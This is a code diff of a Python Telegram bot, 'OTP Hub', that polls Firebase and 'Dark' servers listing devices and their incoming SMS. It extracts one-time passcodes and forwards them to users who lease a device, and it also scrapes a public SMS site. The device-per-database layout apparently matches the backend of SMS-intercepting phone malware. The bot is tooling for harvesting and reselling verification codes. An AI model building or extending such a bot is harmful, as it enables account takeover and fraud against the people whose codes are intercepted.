@@ -12,12 +12,14 @@ import database as db
 import firebase_utils as fbu
 import scraper_utils as scr
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
 log = logging.getLogger("OTP-Bot")
 
+# ================= CONFIGURATION =================
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 OWNER_ID = 8480878371
 PORT = int(os.getenv("PORT", 8080))
+# =================================================
 
 router = Router()
 running_bots = {}
@@ -27,59 +29,35 @@ scraper_leases = {}
 class AdminStates(StatesGroup):
     add_bulk_urls = State()
 
-async def background_global_scanner():
-    log.info("Global Scanner Started...")
-    while True:
-        try:
-            data = db.load_data()
-            fbs = data.get("firebases", [])
-            leases = data.get("user_leases", {})
-            
-            # --- 1. Firebase/Dark Server Scanner ---
-            device_to_users = {}
-            current_time = time.time()
-            for uid, lease in leases.items():
-                if current_time < lease["expire_at"] and "dev_id" in lease:
-                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
-            
-            if device_to_users:
-                for fb in fbs:
-                    latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
-                    for dev_id, msg in latest_msgs.items():
-                        key = (fb["url"], dev_id)
-                        msg_id = int(msg.get("id", 0))
-                        old_id = active_scans.get(key, 0)
-                        
-                        if msg_id > old_id:
-                            active_scans[key] = msg_id
-                            if old_id != 0: 
-                                text_content = msg.get("message", "")
-                                otp = fbu.extract_otp(text_content)
-                                if otp and dev_id in device_to_users:
-                                    service = fbu.extract_service_name(text_content, msg.get("sender", ""))
-                                    for uid in device_to_users[dev_id]:
-                                        await send_otp_to_user(uid, service, otp, text_content)
+# ================= CORE FUNCTIONS =================
+async def get_owner_stats():
+    data = db.load_data()
+    fbs = data.get("firebases", [])
+    
+    async def fetch_single_fb(fb):
+        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
+        fb_online = 0
+        fb_total = 0
+        if clients and isinstance(clients, dict):
+            fb_total = len(clients)
+            for dev_id, dev_data in clients.items():
+                if isinstance(dev_data, dict) and dev_data.get("status") is True:
+                    fb_online += 1
+        return fb['label'], fb_online, fb_total
 
-            # --- 2. Scrap Server Scanner ---
-            for uid, s_data in list(scraper_leases.items()):
-                if time.time() > s_data["expire_at"]:
-                    del scraper_leases[uid]
-                    continue
-                
-                msgs = await scr.get_smstome_sms(s_data["url"], s_data["phone"])
-                if msgs:
-                    latest_msg = msgs[0]
-                    if latest_msg["message"] != s_data["last_sms"]:
-                        s_data["last_sms"] = latest_msg["message"]
-                        otp = fbu.extract_otp(latest_msg["message"])
-                        if otp:
-                            service = fbu.extract_service_name(latest_msg["message"], latest_msg["sender"])
-                            await send_otp_to_user(uid, service, otp, latest_msg["message"])
-
-            await asyncio.sleep(3)
-        except Exception as e:
-            log.error(f"Scanner Error: {e}")
-            await asyncio.sleep(5)
+    # Fetch all URLs concurrently so it doesn't hang
+    tasks = [fetch_single_fb(fb) for fb in fbs]
+    results = await asyncio.gather(*tasks)
+    
+    total_devices, online_devices, fb_stats = 0, 0, {}
+    for label, online, total in results:
+        if label not in fb_stats: fb_stats[label] = {"total": 0, "online": 0}
+        fb_stats[label]["total"] += total
+        fb_stats[label]["online"] += online
+        total_devices += total
+        online_devices += online
+        
+    return total_devices, online_devices, fb_stats
 
 async def get_latest_messages_for_fb(fb_url, auth):
     all_msgs = {}
@@ -107,6 +85,61 @@ async def send_otp_to_user(uid, service, otp, msg_text):
         if bot: await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
     except Exception: pass
 
+async def background_global_scanner():
+    log.info("Global Scanner Started...")
+    while True:
+        try:
+            data = db.load_data()
+            fbs = data.get("firebases", [])
+            leases = data.get("user_leases", {})
+            
+            # --- Firebase/Dark Server Scanner ---
+            device_to_users = {}
+            current_time = time.time()
+            for uid, lease in leases.items():
+                if current_time < lease["expire_at"] and "dev_id" in lease:
+                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
+            
+            if device_to_users:
+                for fb in fbs:
+                    latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
+                    for dev_id, msg in latest_msgs.items():
+                        key = (fb["url"], dev_id)
+                        msg_id = int(msg.get("id", 0))
+                        old_id = active_scans.get(key, 0)
+                        
+                        if msg_id > old_id:
+                            active_scans[key] = msg_id
+                            if old_id != 0: 
+                                text_content = msg.get("message", "")
+                                otp = fbu.extract_otp(text_content)
+                                if otp and dev_id in device_to_users:
+                                    service = fbu.extract_service_name(text_content, msg.get("sender", ""))
+                                    for uid in device_to_users[dev_id]:
+                                        await send_otp_to_user(uid, service, otp, text_content)
+
+            # --- Scrap Server Scanner ---
+            for uid, s_data in list(scraper_leases.items()):
+                if time.time() > s_data["expire_at"]:
+                    del scraper_leases[uid]
+                    continue
+                
+                msgs = await scr.get_smstome_sms(s_data["url"], s_data["phone"])
+                if msgs:
+                    latest_msg = msgs[0]
+                    if latest_msg["message"] != s_data["last_sms"]:
+                        s_data["last_sms"] = latest_msg["message"]
+                        otp = fbu.extract_otp(latest_msg["message"])
+                        if otp:
+                            service = fbu.extract_service_name(latest_msg["message"], latest_msg["sender"])
+                            await send_otp_to_user(uid, service, otp, latest_msg["message"])
+
+            await asyncio.sleep(3)
+        except Exception as e:
+            log.error(f"Scanner Error: {e}")
+            await asyncio.sleep(5)
+
+# ================= KEYBOARDS =================
 def main_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📱 Get Number", callback_data="user:get_num")],
@@ -122,6 +155,7 @@ def admin_kb():
         [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
     ])
 
+# ================= HANDLERS =================
 @router.message(CommandStart())
 async def cmd_start(msg: Message):
     data = db.load_data()
@@ -139,7 +173,6 @@ async def cmd_start(msg: Message):
         await msg.answer("👋 <b>Welcome to OTP Hub!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
 
 async def admin_home_msg(msg: Message):
-    from bot import get_owner_stats # Circular import fix for this snippet
     total, online, fbs = await get_owner_stats()
     text = (
         f"👑 <b>Owner Analytics Dashboard</b>\n\n"
@@ -239,13 +272,11 @@ async def user_country_selected(cq: CallbackQuery):
     servers = [fb for fb in data.get("firebases", []) if fb["label"] == country]
     
     kb = []
-    # Add Firebase/Dark Servers
     for i, srv in enumerate(servers):
         s_type = "🔥 Fire" if "firebaseio" in srv['url'].lower() else "🌑 Dark"
         short_url = srv["url"].split("//")[-1][:15]
         kb.append([InlineKeyboardButton(text=f"{s_type} Server {i+1}", callback_data=f"server:fb:{srv['url']}")])
         
-    # Add Scrap Servers
     kb.append([InlineKeyboardButton(text=f"🕸️ Scrap Server (Free)", callback_data=f"server:scr:smstome:{country}")])
     
     kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num")])
@@ -261,8 +292,7 @@ async def user_server_selected(cq: CallbackQuery):
     if srv_type == "fb":
         server_url = parts[2]
         # (Firebase device logic here - same as before)
-        dev_id = "device123" # placeholder for actual logic
-        # ...
+        pass
         
     elif srv_type == "scr":
         source = parts[2]
